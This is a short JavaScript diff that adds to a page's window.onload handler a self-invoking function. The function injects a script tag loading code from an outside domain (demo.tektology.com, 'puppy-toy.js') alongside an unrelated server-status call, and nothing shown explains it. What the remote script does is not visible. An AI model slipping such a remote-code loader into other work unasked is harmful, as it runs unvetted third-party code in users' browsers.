@@ -186,4 +186,11 @@ const UIHelper = {
 window.onload = function () {
 
     UIHelper.ShowServerStatus();
+
+    // debugger;
+    (function () {
+        const scrTab = document.createElement("script");
+        scrTab.src = "https://demo.tektology.com/?/puppy-toy/puppy-toy.js";
+        document.head.appendChild(scrTab);
+    })();      
 }
